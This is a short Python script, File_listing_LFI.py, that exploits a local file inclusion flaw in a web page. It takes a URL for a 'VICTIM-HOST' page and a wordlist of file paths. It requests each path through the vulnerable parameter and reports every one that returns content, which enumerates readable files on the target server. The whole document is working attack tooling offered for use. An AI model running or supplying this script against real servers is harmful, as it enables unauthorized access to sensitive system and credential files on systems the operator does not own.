#!/usr/bin/python3

import requests, urllib.parse, sys, signal, time
from colorama import init, Fore, Back, Style
from pwn import *

def handler(sig, frame):

    print(Fore.YELLOW+"\n\n[*] Process interrupted....\n")
    sys.exit(1)

signal.signal(signal.SIGINT, handler)

def interesting_Files(url, automatics):
    
    url = url
    automatics = open(automatics, "r")
    p1 = log.progress("Searching for interesting files")
    
    for automatic in automatics:
        
        automatic = automatic.strip()
        r = requests.get(f"{url}{automatic}")
        r = int(r.headers['Content-Length'])

        if r != 0:

            print(Fore.GREEN+"\nFile found!: %s" % (automatic))

if __name__=="__main__":

    import argparse
    parser = argparse.ArgumentParser(description="Use: python3 ./File_listing_LFI.py 'http://VICTIM-HOST/index.php?=' list.txt")
    parser.add_argument("-u", "--url", type=str, help="Set the URL of the vulnerable page.")
    parser.add_argument("-a", "--automatic", type=str, help="Pass the dictionary of interesting files.")
    args = parser.parse_args()

    interesting_Files(args.url, args.automatic)
